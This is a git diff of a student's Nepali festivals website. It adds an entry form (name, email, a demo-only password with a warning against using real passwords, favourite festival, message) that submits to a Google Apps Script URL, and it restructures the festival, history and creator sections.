+                <label for="name">नाम</label>
+                <input
+                    type="text"
+                    id="name"
+                    name="name"
+                    placeholder="तपाईंको नाम"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input
+                    type="email"
+                    id="email"
+                    name="email"
+                    placeholder="example@gmail.com"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="password">Project Password</label>
+                <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    placeholder="Demo password"
+                    minlength="6"
+                    required
+                >
+            </div>
+
+            <div class="warning">
+                ⚠️ यो केवल project/demo password field हो।
+                आफ्नो वास्तविक Gmail/Google password, OTP वा अन्य
+                गोप्य password यहाँ नराख्नुहोस्।
+            </div>
+
+            <div class="form-group">
+                <label for="festival">मनपर्ने चाडपर्व</label>
+
+                <select id="festival" name="festival" required>
+                    <option value="">Select Festival</option>
+                    <option value="Dashain">Dashain</option>
+                    <option value="Tihar">Tihar</option>
+                    <option value="Chhath">Chhath</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="message">Message</label>
+
+                <textarea
+                    id="message"
+                    name="message"
+                    placeholder="आफ्नो सन्देश लेख्नुहोस्..."
+                    required
+                ></textarea>
+            </div>
+
+            <button
+                type="submit"
+                class="submit-btn"
+                id="submitBtn"
             >
-                चाडपर्व हेर्नुहोस् ↓
-            </a>
+                Submit
+            </button>
 
-            <a
-                href="#history"
-                class="btn"
-                style="text-decoration:none;"
-            >
-                📖 इतिहास पढ्नुहोस्
-            </a>
+            <div class="loading" id="loading">
+                ⏳ Data पठाउँदै...
+            </div>
 
-        </div>
+        </form>
 
     </div>
 
+    <!-- ================= SUCCESS ================= -->
 
-    <div class="mandala-wrap">
+    <div class="gate-card hidden" id="successCard">
 
-        <div class="mandala">
+        <div class="gate-icon">✅</div>
 
-            <div class="mandala-center">
-                🇳🇵
-            </div>
+        <h1>Success!</h1>
 
-        </div>
+        <p>
+            तपाईंको जानकारी सफलतापूर्वक पठाइयो।
+        </p>
+
+        <button class="start-btn" id="startBtn">
+            Start Website
+        </button>
 
     </div>
 
 </div>
-```
-
-</section>
-
-<!-- FESTIVALS -->
-
-<section id="festivals">
-
-```
-<div class="container">
-
-    <div class="section-title">
-
-        <h2>
-            प्रमुख नेपाली चाडपर्व
-        </h2>
-
-        <p>
-            उत्पत्ति, परम्परा र सांस्कृतिक महत्वको परिचय
-        </p>
-
-    </div>
 
 
-    <div class="cards">
+<!-- ================= MAIN WEBSITE ================= -->
+
+<div id="website">
+
+    <!-- NAVBAR -->
+
+    <nav>
+
+        <div class="logo">
+            🪔 Nepali Festivals
+        </div>
+
+        <div class="nav-links">
+
+            <a href="#home">होम</a>
+            <a href="#festivals">मुख्य पृष्ठ</a>
+            <a href="#history">उत्पत्ति</a>
+            <a href="#about">हाम्रो बारेमा</a>
+            <a href="#features">विशेषता</a>
+            <a href="#creator">प्रोफाइल</a>
+            <a href="#diya">दीप</a>
+
+        </div>
+
+    </nav>
 
 
-        <div class="card">
+    <!-- HERO -->
 
-            <div class="card-icon">
-                🪁
+    <section class="hero" id="home">
+
+        <div class="hero-content">
+
+            <div class="badge">
+                नेपालको संस्कृति र परम्परा
             </div>
 
-            <h3>
-                दशैं
-            </h3>
-
-            <div class="date">
-                असोज / कार्तिक
-            </div>
+            <h1>
+                नेपाली चाडपर्व
+            </h1>
 
             <p>
-                दशैं नेपालको प्रमुख पर्वहरूमध्ये एक हो।
-                यो पर्व शक्ति, विजय, परिवार र
-                आशीर्वादसँग सम्बन्धित विभिन्न
-                धार्मिक तथा सांस्कृतिक परम्परासँग जोडिएको छ।
+                नेपालका महत्वपूर्ण चाडपर्व, तिनको इतिहास,
+                संस्कृति, परम्परा र विशेषताबारे जानकारी दिने
+                एउटा डिजिटल यात्रा।
             </p>
 
-            <a
-                href="#dashain"
-                class="read-more"
-            >
-                थप पढ्नुहोस् →
-            </a>
+            <div class="hero-buttons">
+
+                <a href="#festivals">
+                    चाडपर्व हेर्नुहोस्
+                </a>
+
+                <a href="#about" class="secondary">
+                    हाम्रो बारेमा
+                </a>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+    <!-- FESTIVALS -->
+
+    <section id="festivals">
+
+        <div class="section-title">
+
+            <h2>
+                प्रमुख नेपाली चाडपर्व
+            </h2>
+
+            <p>
+                हाम्रो संस्कृति र परम्पराका महत्वपूर्ण पर्वहरू
+            </p>
 
         </div>
 
 
-        <div class="card">
+        <div class="cards">
 
-            <div class="card-icon">
-                🪔
-            </div>
+            <div class="card">
 
-            <h3>
-                तिहार
-            </h3>
-
-            <div class="date">
-                कार्तिक
-            </div>
-
-            <p>
-                तिहारलाई दीपावली पनि भनिन्छ।
-                यस पर्वमा दियो बाल्ने, घर सजाउने,
-                देउसी–भैलो खेल्ने तथा भाइटीका
-                लगाउने जस्ता परम्परा छन्।
-            </p>
-
-            <a
-                href="#tihar"
-                class="read-more"
-            >
-                थप पढ्नुहोस् →
-            </a>
-
-        </div>
-
-
-        <div class="card">
-
-            <div class="card-icon">
-                🌅
-            </div>
-
-            <h3>
-                छठ पर्व
-            </h3>
-
-            <div class="date">
-                कार्तिक / मंसिर
-            </div>
-
-            <p>
-                छठ सूर्य उपासनासँग सम्बन्धित
-                महत्वपूर्ण पर्व हो। यसमा अस्ताउँदो
-                र उदाउँदो सूर्यलाई अर्घ्य दिने
-                विशेष परम्परा रहेको छ।
-            </p>
-
-            <a
-                href="#chhath"
-                class="read-more"
-            >
-                थप पढ्नुहोस् →
-            </a>
-
-        </div>
-
-    </div>
-
-</div>
-```
-
-</section>
-
-<!-- HISTORY -->
-
-<section id="history">
-
-```
-<div class="container">
-
-    <div class="section-title">
-
-        <h2>
-            📖 चाडपर्वको उत्पत्ति र विस्तृत जानकारी
-        </h2>
-
-        <p>
-            कसरी सुरु भयो? किन मनाइन्छ? यसको महत्व के हो?
-        </p>
-
-    </div>
-
-
-    <div class="details-container">
-
-
-        <!-- DASHHAIN -->
-
-        <article
-            class="festival-detail"
-            id="dashain"
-        >
-
-            <div class="detail-header">
-
-                <div class="detail-icon">
-                    🪁
+                <div class="festival-icon">
+                    🌺
                 </div>
 
-                <div>
-
-                    <h3>
-                        दशैं
-                    </h3>
-
-                    <span>
-                        विजय, शक्ति, परिवार र आशीर्वादको पर्व
-                    </span>
-
-                </div>
-
-            </div>
-
-
-            <div class="detail-content">
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        🏛️ कसरी उत्पत्ति भयो?
-                    </h4>
-
-                    <p>
-                        दशैंको धार्मिक परम्परा हिन्दू धर्मका
-                        विभिन्न पौराणिक कथासँग सम्बन्धित छ।
-                        विशेषगरी देवी दुर्गाले असुर शक्तिमाथि
-                        विजय प्राप्त गरेको कथालाई दशैंको
-                        प्रमुख धार्मिक आधारका रूपमा लिइन्छ।
-                        विभिन्न स्थान र समुदायमा दशैंसँग
-                        सम्बन्धित कथा र पूजा परम्परामा
-                        केही भिन्नता पनि पाइन्छ।
-                    </p>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        ❓ किन मनाइन्छ?
-                    </h4>
-
-                    <p>
-                        दशैंलाई सत्यले असत्यमाथि र धर्मले
-                        अधर्ममाथि विजय प्राप्त गरेको
-                        प्रतीकका रूपमा व्याख्या गरिन्छ।
-                        यस अवसरमा देवीको पूजा गरी शक्ति,
-                        सुख, शान्ति र परिवारको कल्याणको
-                        कामना गर्ने परम्परा छ।
-                    </p>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        📅 मुख्य दिनहरू
-                    </h4>
-
-                    <div class="timeline">
-
-                        <div class="timeline-item">
-                            <strong>घटस्थापना</strong>
-                            <p>
-                                जमरा राखेर दशैंको सुरुवात गर्ने
-                                परम्परा।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>फूलपाती</strong>
-                            <p>
-                                दशैंको महत्वपूर्ण दिनमध्ये एक।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>महाअष्टमी</strong>
-                            <p>
-                                देवीको विशेष पूजा गरिने दिन।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>महानवमी</strong>
-                            <p>
-                                नवमीको धार्मिक पूजा र परम्परा।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>विजया दशमी</strong>
-                            <p>
-                                टीका र जमरा लगाई ठूलाबडाबाट
-                                आशीर्वाद लिने मुख्य दिन।
-                            </p>
-                        </div>
-
-                    </div>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        👨‍👩‍👧‍👦 सामाजिक महत्व
-                    </h4>
-
-                    <p>
-                        दशैं परिवार र आफन्तसँग भेटघाट गर्ने
-                        महत्वपूर्ण अवसर पनि हो। टाढा रहेका
-                        परिवारका सदस्यहरू घर फर्कने,
-                        ठूलाबडाबाट आशीर्वाद लिने र
-                        आपसी सम्बन्धलाई निरन्तरता दिने
-                        परम्परा रहेको छ।
-                    </p>
-
-                </div>
-
-            </div>
-
-
-            <div class="detail-full">
-
-                <h4>
-                    🌿 दशैंका प्रमुख परम्परा
-                </h4>
+                <h3>
+                    दशैं
+                </h3>
 
                 <p>
-                    घटस्थापनामा जमरा राख्ने, देवीको पूजा गर्ने,
-                    फूलपाती भित्र्याउने, विभिन्न दिनमा
-                    धार्मिक विधि पूरा गर्ने, विजया दशमीमा
-                    टीका र जमरा लगाउने, आफन्तसँग भेटघाट गर्ने,
-                    पिङ खेल्ने तथा नयाँ कपडा लगाउने जस्ता
-                    परम्पराहरू दशैंसँग जोडिएका छन्।
-                    यी परम्परा समुदाय, स्थान र परिवारअनुसार
-                    फरक हुन सक्छन्।
+                    दशैं नेपालको प्रमुख हिन्दू पर्व हो।
+                    यो परिवार, आशीर्वाद, टीका र जमरा
+                    तथा आपसी भेटघाटसँग सम्बन्धित पर्व हो।
                 </p>
 
             </div>
 
-        </article>
 
+            <div class="card">
 
-        <!-- TIHAR -->
-
-        <article
-            class="festival-detail"
-            id="tihar"
-        >
-
-            <div class="detail-header">
-
-                <div class="detail-icon">
+                <div class="festival-icon">
                     🪔
                 </div>
 
-                <div>
-
-                    <h3>
-                        तिहार
-                    </h3>
-
-                    <span>
-                        प्रकाश, सम्मान, समृद्धि र भाइबहिनीको सम्बन्धको पर्व
-                    </span>
-
-                </div>
-
-            </div>
-
-
-            <div class="detail-content">
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        🏛️ कसरी उत्पत्ति भयो?
-                    </h4>
-
-                    <p>
-                        तिहारसँग नेपालका विभिन्न धार्मिक तथा
-                        सांस्कृतिक परम्पराहरू जोडिएका छन्।
-                        पाँच दिनमा काग, कुकुर, गाई, लक्ष्मी,
-                        गोवर्धन तथा भाइटीका जस्ता परम्परा
-                        मनाइन्छन्। भाइटीकासँग यमराज र
-                        यमुनाको कथालाई पनि जोडेर व्याख्या
-                        गर्ने धार्मिक परम्परा पाइन्छ।
-                    </p>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        ❓ किन मनाइन्छ?
-                    </h4>
-
-                    <p>
-                        तिहारमा पशुपक्षीप्रति सम्मान,
-                        प्रकृतिप्रति कृतज्ञता, धन–समृद्धिको
-                        कामना र परिवारबीचको सम्बन्धलाई
-                        महत्व दिने परम्परा छ। घरमा दीप
-                        बाल्नुले प्रकाश र शुभताको प्रतीकात्मक
-                        अर्थ पनि बोकेको मानिन्छ।
-                    </p>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        📅 पाँच दिनको परम्परा
-                    </h4>
-
-                    <div class="timeline">
-
-                        <div class="timeline-item">
-                            <strong>काग तिहार</strong>
-                            <p>
-                                कागलाई सम्मान गर्ने दिन।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>कुकुर तिहार</strong>
-                            <p>
-                                कुकुरलाई सम्मान र पूजा गर्ने दिन।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>गाई तिहार / लक्ष्मी पूजा</strong>
-                            <p>
-                                गाईको सम्मान तथा लक्ष्मी पूजा गर्ने
-                                विशेष दिन।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>गोवर्धन पूजा / म्ह पूजा</strong>
-                            <p>
-                                समुदायअनुसार विभिन्न धार्मिक तथा
-                                सांस्कृतिक परम्परा मनाइन्छन्।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>भाइटीका</strong>
-                            <p>
-                                दाजुभाइ तथा दिदीबहिनीबीच टीका
-                                र आशीर्वाद आदानप्रदान गरिन्छ।
-                            </p>
-                        </div>
-
-                    </div>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        💡 विशेषता
-                    </h4>
-
-                    <p>
-                        तिहारको सबैभन्दा देखिने विशेषतामध्ये
-                        घर–आँगनमा दियो तथा बत्ती बालेर
-                        सजाउनु हो। देउसी–भैलो, रङ्गोली,
-                        फूलको माला र विभिन्न सांस्कृतिक
-                        गतिविधिले वातावरणलाई उत्सवमय बनाउँछन्।
-                    </p>
-
-                </div>
-
-            </div>
-
-
-            <div class="detail-full">
-
-                <h4>
-                    🌸 सांस्कृतिक महत्व
-                </h4>
+                <h3>
+                    तिहार
+                </h3>
 
                 <p>
-                    तिहारले मानिस र प्रकृतिबीचको सम्बन्धलाई
-                    सम्झाउने विभिन्न परम्परा बोकेको छ।
-                    काग, कुकुर र गाईलाई सम्मान गर्ने चलनदेखि
-                    लक्ष्मी पूजासम्मका गतिविधिले नेपाली
-                    समाजमा रहेका धार्मिक तथा सांस्कृतिक
-                    विविधतालाई देखाउँछन्। भाइटीकाले
-                    दाजुभाइ तथा दिदीबहिनीबीचको सम्बन्धलाई
-                    विशेष महत्व दिन्छ।
+                    तिहार उज्यालो, दीप, फूल, देउसी-भैलो
+                    तथा विभिन्न सांस्कृतिक परम्परासँग
+                    सम्बन्धित सुन्दर पर्व हो।
                 </p>
 
             </div>
 
-        </article>
 
+            <div class="card">
 
-        <!-- CHHATH -->
-
-        <article
-            class="festival-detail"
-            id="chhath"
-        >
-
-            <div class="detail-header">
-
-                <div class="detail-icon">
-                    🌅
+                <div class="festival-icon">
+                    ☀️
                 </div>
 
-                <div>
-
-                    <h3>
-                        छठ पर्व
-                    </h3>
-
-                    <span>
-                        सूर्य उपासना, श्रद्धा र प्रकृतिप्रतिको सम्मानको पर्व
-                    </span>
-
-                </div>
-
-            </div>
-
-
-            <div class="detail-content">
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        🏛️ कसरी उत्पत्ति भयो?
-                    </h4>
-
-                    <p>
-                        छठ पर्व सूर्य उपासनासँग सम्बन्धित
-                        प्राचीन धार्मिक परम्परामा आधारित
-                        मानिन्छ। यस पर्वमा सूर्यदेव र
-                        छठी माताको आराधना गरिन्छ।
-                        यसको धार्मिक परम्परा विशेषगरी
-                        भारतीय उपमहाद्वीपका विभिन्न
-                        समुदायमा लामो समयदेखि प्रचलित छ।
-                    </p>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        ❓ किन मनाइन्छ?
-                    </h4>
-
-                    <p>
-                        सूर्यलाई जीवन र ऊर्जाको महत्वपूर्ण
-                        स्रोतका रूपमा सम्मान गर्दै स्वास्थ्य,
-                        सुख, समृद्धि र परिवारको कल्याणको
-                        कामना गर्ने परम्परा छ।
-                        श्रद्धालुहरूले विशेष विधि र
-                        अनुशासनका साथ पूजा गर्ने गर्छन्।
-                    </p>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        📅 मुख्य गतिविधिहरू
-                    </h4>
-
-                    <div class="timeline">
-
-                        <div class="timeline-item">
-                            <strong>तयारी</strong>
-                            <p>
-                                घर तथा पूजा स्थल सफा गरी
-                                प्रसादको तयारी गरिन्छ।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>व्रत</strong>
-                            <p>
-                                श्रद्धालुहरूले आफ्नो परम्पराअनुसार
-                                व्रत तथा धार्मिक अनुशासन पालना गर्छन्।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>अस्ताउँदो सूर्यलाई अर्घ्य</strong>
-                            <p>
-                                जलाशयको किनारमा अस्ताउँदो सूर्यलाई
-                                अर्घ्य दिने विशेष विधि।
-                            </p>
-                        </div>
-
-                        <div class="timeline-item">
-                            <strong>उदाउँदो सूर्यलाई अर्घ्य</strong>
-                            <p>
-                                बिहान उदाउँदो सूर्यलाई अर्घ्य दिएपछि
-                                पर्वको मुख्य पूजा सम्पन्न गरिन्छ।
-                            </p>
-                        </div>
-
-                    </div>
-
-                </div>
-
-
-                <div class="detail-part">
-
-                    <h4>
-                        🌊 कहाँ मनाइन्छ?
-                    </h4>
-
-                    <p>
-                        नेपालमा छठ पर्व विशेषगरी तराई–मधेस
-                        क्षेत्रमा ठूलो श्रद्धा र उत्साहका
-                        साथ मनाइन्छ। नदी, पोखरी तथा अन्य
-                        जलाशयका किनारमा पूजा स्थल सजाउने
-                        परम्परा पनि पाइन्छ।
-                    </p>
-
-                </div>
-
-            </div>
-
-
-            <div class="detail-full">
-
-                <h4>
-                    🍌 प्रसाद र पूजा सामग्री
-                </h4>
+                <h3>
+                    छठ
+                </h3>
 
                 <p>
-                    छठमा विभिन्न प्रकारका फलफूल,
-                    ठेकुवा लगायतका परम्परागत प्रसाद
-                    तयार गर्ने चलन छ। पूजा सामग्रीलाई
-                    सफा राख्ने र धार्मिक विधिअनुसार
-                    अर्घ्य दिने विशेष महत्व हुन्छ।
-                    विभिन्न समुदाय र परिवारअनुसार
-                    सामग्री तथा विधिमा केही भिन्नता हुन सक्छ।
+                    छठ सूर्यको उपासना र प्रकृतिप्रतिको
+                    सम्मानसँग जोडिएको महत्वपूर्ण पर्व हो।
                 </p>
 
             </div>
 
-        </article>
-
-    </div>
-
-</div>
-```
-
-</section>
-
-<!-- ABOUT -->
-
-<section id="about">
-
-```
-<div class="container">
-
-    <div class="section-title">
-
-        <h2>
-            हाम्रो बारेमा
-        </h2>
-
-        <p>
-            नेपाली संस्कृति र चाडपर्वको परिचय
-        </p>
-
-    </div>
-
-
-    <div class="about-box">
-
-        <p>
-            नेपाल विभिन्न संस्कृति, भाषा, जातजाति
-            र परम्पराले भरिएको देश हो। यहाँ वर्षभरि
-            विभिन्न धार्मिक, सांस्कृतिक तथा
-            सामाजिक चाडपर्वहरू मनाइन्छन्।
-        </p>
-
-        <p>
-            एउटै चाडपर्व पनि फरक समुदाय र स्थानमा
-            फरक तरिकाले मनाउन सकिन्छ। यही विविधता
-            नेपाली संस्कृतिको एउटा महत्वपूर्ण विशेषता हो।
-        </p>
-
-        <p>
-            यस वेबसाइटको उद्देश्य नेपाली चाडपर्वबारे
-            सामान्य ऐतिहासिक, धार्मिक तथा सांस्कृतिक
-            जानकारीलाई आधुनिक र आकर्षक वेब डिजाइनमार्फत
-            प्रस्तुत गर्नु हो।
-        </p>
-
-    </div>
-
-</div>
-```
-
-</section>
-
-<!-- MENU -->
-
-<section id="menu">
-
-```
-<div class="container">
-
-    <div class="section-title">
-
-        <h2>
-            पर्वका विशेषता
-        </h2>
-
-        <p>
-            चाडपर्वसँग जोडिएका प्रमुख पक्षहरू
-        </p>
-
-    </div>
-
-
-    <div class="menu-grid">
-
-        <div class="menu-item">
-
-            <div class="emoji">
-                👨‍👩‍👧‍👦
-            </div>
-
-            <h3>
-                परिवार
-            </h3>
-
         </div>
 
-
-        <div class="menu-item">
-
-            <div class="emoji">
-                🍛
-            </div>
-
-            <h3>
-                परिकार
-            </h3>
-
-        </div>
+    </section>
 
 
-        <div class="menu-item">
+    <!-- HISTORY -->
 
-            <div class="emoji">
-                🪔
-            </div>
+    <section id="history">
 
-            <h3>
-                दीप
-            </h3>
+        <div class="section-title">
 
-        </div>
-
-
-        <div class="menu-item">
-
-            <div class="emoji">
-                🎊
-            </div>
-
-            <h3>
-                उत्सव
-            </h3>
-
-        </div>
-
-    </div>
-
-</div>
-```
-
-</section>
-
-<!-- CONTENT -->
-
-<section>
-
-```
-<div class="container">
-
-    <div class="section-title">
-
-        <h2>
-            पर्व सामग्री
-        </h2>
-
-        <p>
-            परम्परा र सांस्कृतिक गतिविधिहरू
-        </p>
-
-    </div>
-
-
-    <div class="content-box">
-
-
-        <div class="content-card">
-
-            <h3>
-                🪁 दशैंमा
-            </h3>
-
-            <ul>
-
-                <li>
-                    घटस्थापना र जमरा राख्ने
-                </li>
-
-                <li>
-                    टीका र जमरा लगाउने
-                </li>
-
-                <li>
-                    परिवार तथा आफन्तसँग भेटघाट
-                </li>
-
-                <li>
-                    पिङ खेल्ने
-                </li>
-
-                <li>
-                    ठूलाबडाबाट आशीर्वाद लिने
-                </li>
-
-            </ul>
-
-        </div>
-
-
-        <div class="content-card">
-
-            <h3>
-                🪔 तिहारमा
-            </h3>
-
-            <ul>
-
-                <li>
-                    घरमा दीप बाल्ने
-                </li>
-
-                <li>
-                    रङ्गोली तथा फूलले सजाउने
-                </li>
-
-                <li>
-                    देउसी–भैलो खेल्ने
-                </li>
-
-                <li>
-                    लक्ष्मी पूजा गर्ने
-                </li>
-
-                <li>
-                    भाइटीका लगाउने
-                </li>
-
-            </ul>
-
-        </div>
-
-
-        <div class="content-card">
-
-            <h3>
-                🌅 छठमा
-            </h3>
-
-            <ul>
-
-                <li>
-                    सूर्यदेवको पूजा
-                </li>
-
-                <li>
-                    नदी तथा पोखरीको किनारमा पूजा
-                </li>
-
-                <li>
-                    परम्परागत प्रसाद तयार गर्ने
-                </li>
-
-                <li>
-                    अस्ताउँदो सूर्यलाई अर्घ्य
-                </li>
-
-                <li>
-                    उदाउँदो सूर्यलाई अर्घ्य
-                </li>
-
-            </ul>
-
-        </div>
-
-
-        <div class="content-card">
-
-            <h3>
-                🇳🇵 हाम्रो संस्कृति
-            </h3>
+            <h2>
+                चाडपर्वको इतिहास
+            </h2>
 
             <p>
-                नेपाली चाडपर्वहरूले सामाजिक सम्बन्ध,
-                पारिवारिक भेटघाट, धार्मिक विश्वास,
-                प्रकृतिप्रतिको सम्मान र सांस्कृतिक
-                परम्परालाई निरन्तरता दिन महत्वपूर्ण
-                भूमिका खेल्छन्।
+                परम्परा र सांस्कृतिक महत्व
             </p>
 
         </div>
 
-    </div>
 
-</div>
-```
+        <div class="history">
 
-</section>
+            <div class="history-item">
 
-<!-- PROFILE -->
+                <h3>
+                    🌺 दशैं
+                </h3>
 
-<section id="profile">
+                <p>
+                    दशैंलाई नेपालमा ठूलो सामाजिक तथा
+                    सांस्कृतिक पर्वका रूपमा मनाइन्छ।
+                    परिवारका सदस्यहरू एकै ठाउँमा जम्मा हुने,
+                    ठूलाबडाबाट टीका तथा आशीर्वाद लिने
+                    परम्परा यस पर्वको महत्वपूर्ण पक्ष हो।
+                </p>
 
-```
-<div class="container">
-
-    <div class="section-title">
-
-        <h2>
-            Project Creator
-        </h2>
-
-        <p>
-            वेबसाइट निर्माण
-        </p>
-
-    </div>
+            </div>
 
 
-    <div class="profile">
+            <div class="history-item">
 
-        <img
-            src="profile.png"
-            alt="Sudip Budha"
-            onerror="this.style.display='none';"
-        >
+                <h3>
+                    🪔 तिहार
+                </h3>
 
-        <h2>
-            Sudip Budha
-        </h2>
+                <p>
+                    तिहार पाँच दिनसम्म विभिन्न सांस्कृतिक
+                    परम्परासहित मनाइने पर्व हो।
+                    काग, कुकुर, गाई तथा भाइटीकाजस्ता
+                    परम्पराहरू यससँग जोडिएका छन्।
+                    घरमा दीप प्रज्वलन र देउसी-भैलो
+                    पनि यसको विशेषता हो।
+                </p>
 
-        <p>
-            Web Project Creator
-        </p>
+            </div>
 
-        <div class="chips">
 
-            <span class="chip">
-                HTML
-            </span>
+            <div class="history-item">
 
-            <span class="chip">
-                CSS
-            </span>
+                <h3>
+                    ☀️ छठ
+                </h3>
 
-            <span class="chip">
-                JavaScript
-            </span>
+                <p>
+                    छठ पर्व सूर्य तथा प्रकृतिप्रतिको
+                    श्रद्धासँग सम्बन्धित पर्व हो।
+                    विशेषगरी तराई-मधेश क्षेत्रमा यसको
+                    सांस्कृतिक महत्व निकै ठूलो छ।
+                </p>
 
-            <span class="chip">
-                Google Apps Script
-            </span>
-
-            <span class="chip">
-                GitHub Pages
-            </span>
+            </div>
 
         </div>
 
-    </div>
+    </section>
 
-</div>
-```
 
-</section>
+    <!-- ABOUT -->
 
-<!-- DIYA -->
+    <section id="about">
 
-<section id="diya">
+        <div class="section-title">
 
-```
-<div class="container">
+            <h2>
+                हाम्रो बारेमा
+            </h2>
 
-    <div class="section-title">
+        </div>
 
-        <h2>
-            🪔 नेपाली दीप
-        </h2>
+        <div class="about-box">
+
+            <p>
+                यो वेबसाइट नेपाली चाडपर्व तथा हाम्रो
+                सांस्कृतिक परम्परालाई डिजिटल रूपमा
+                प्रस्तुत गर्ने शैक्षिक project हो।
+            </p>
+
+            <p>
+                यसको उद्देश्य नेपाली संस्कृति,
+                परम्परा र चाडपर्वबारे सरल र आकर्षक
+                तरिकाले जानकारी प्रदान गर्नु हो।
+            </p>
+
+        </div>
+
+    </section>
+
+
+    <!-- FEATURES -->
+
+    <section id="features">
+
+        <div class="section-title">
+
+            <h2>
+                वेबसाइटका विशेषता
+            </h2>
+
+        </div>
+
+
+        <div class="cards">
+
+            <div class="card">
+
+                <div class="festival-icon">
+                    📚
+                </div>
+
+                <h3>
+                    Educational
+                </h3>
+
+                <p>
+                    नेपाली चाडपर्वसम्बन्धी जानकारी
+                    सरल रूपमा प्रस्तुत गरिएको छ।
+                </p>
+
+            </div>
+
+
+            <div class="card">
+
+                <div class="festival-icon">
+                    📱
+                </div>
+
+                <h3>
+                    Mobile Friendly
+                </h3>
+
+                <p>
+                    Android तथा अन्य mobile device मा
+                    प्रयोग गर्न मिल्ने responsive design।
+                </p>
+
+            </div>
+
+
+            <div class="card">
+
+                <div class="festival-icon">
+                    🌙
+                </div>
+
+                <h3>
+                    Dark 3D Style
+                </h3>
+
+                <p>
+                    Modern dark interface र glowing
+                    visual design प्रयोग गरिएको छ।
+                </p>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+    <!-- CREATOR -->
+
+    <section id="creator">
+
+        <div class="section-title">
+
+            <h2>
+                Project Creator
+            </h2>
+
+        </div>
+
+        <div class="creator">
+
+            <h3>
+                Sudip Budha
+            </h3>
+
+            <p>
+                नेपाली संस्कृति र प्रविधिलाई जोडेर
+                बनाइएको यो project एक विद्यार्थीको
+                learning project हो।
+            </p>
+
+        </div>
+
+    </section>
+
+
+    <!-- DIYA -->
+
+    <section id="diya">
+
+        <div class="diya">
+            🪔
+        </div>
+
+        <div class="section-title">
+
+            <h2>
+                संस्कृति सधैं उज्यालो रहोस्
+            </h2>
+
+            <p>
+                नेपाली कला, संस्कृति र परम्पराको सम्मान गरौं।
+            </p>
+
+        </div>
+
+    </section>
+
+
+    <!-- FOOTER -->
+
+    <footer>
 
         <p>
-            प्रकाश, शान्ति र संस्कृतिको प्रतीक
+            © 2026 Nepali Festivals
         </p>
-
-    </div>
-
-
-    <div class="diya">
-
-        <div class="flame"></div>
-
-    </div>
-
-</div>
-```
-
-</section>
-
-<!-- FINAL -->
-
-<section>
-
-```
-<div class="container">
-
-    <div class="final-box">
-
-        <h2>
-            🎉 धन्यवाद!
-        </h2>
 
         <p>
-            नेपाली चाडपर्वको यस सानो डिजिटल
-            यात्रामा सहभागी हुनुभएकोमा धन्यवाद।
-            हाम्रो संस्कृति, परम्परा र पहिचानलाई
-            सधैं सम्मान गरौं।
+            Developed by Sudip Budha
         </p>
 
-    </div>
+    </footer>
 
 </div>
-```
 
-</section>
-
-<!-- FOOTER -->
-
-<footer>
-
-```
-<p>
-    © 2026
-    <strong>Nepali Festivals</strong>
-</p>
-
-<p>
-    Developed by
-    <strong>Sudip Budha</strong>
-</p>
-```
-
-</footer>
-
-</div>
 
 <script>
 
 /* =====================================================
    GOOGLE APPS SCRIPT URL
-=====================================================
+   =====================================================
 
-   यहाँ आफ्नो Apps Script को पूरा /exec URL राख्नुहोस्।
+   यहाँ तपाईंले माथि दिएको /exec Web App URL paste गर्नुहोस्.
+*/
 
-===================================================== */
 const GOOGLE_SCRIPT_URL =
-  "https://script.google.com/macros/s/AKfycbx76WU_61ku9yRRMTed6SpVCC0_iZ_lkBFV728VRI1c44rfADcVaCBqmsZFhmvEzX_S/exec";
+    "https://script.google.com/macros/s/AKfycbwndcMBMRZppa8sNVMkLAP34_nW87E8lQdxiUQ_k32THjDFHTNwljJp_JY2HaG77ppg/exec";
 
 
-/* =====================================================
-   ELEMENTS
-===================================================== */
+/* ================= GATE ELEMENTS ================= */
 
-const securityGate =
-    document.getElementById("securityGate");
+const securityCard =
+    document.getElementById("securityCard");
 
-const formGate =
-    document.getElementById("formGate");
+const formCard =
+    document.getElementById("formCard");
 
-const successGate =
-    document.getElementById("successGate");
-
-const mainWebsite =
-    document.getElementById("mainWebsite");
+const successCard =
+    document.getElementById("successCard");
 
 const continueBtn =
     document.getElementById("continueBtn");
+
+const startBtn =
+    document.getElementById("startBtn");
 
 const festivalForm =
     document.getElementById("festivalForm");
@@ -2517,75 +1090,56 @@ const submitBtn =
 const loading =
     document.getElementById("loading");
 
-const startWebsiteBtn =
-    document.getElementById("startWebsiteBtn");
+const securityGate =
+    document.getElementById("securityGate");
+
+const website =
+    document.getElementById("website");
 
 
-/* =====================================================
-   CONTINUE BUTTON
-===================================================== */
+/* ================= CONTINUE ================= */
 
 continueBtn.addEventListener("click",function(){
 
-    securityGate.style.display = "none";
+    securityCard.classList.add("hidden");
 
-    formGate.style.display = "flex";
+    formCard.classList.remove("hidden");
 
 });
 
 
-/* =====================================================
-   FORM SUBMIT
-===================================================== */
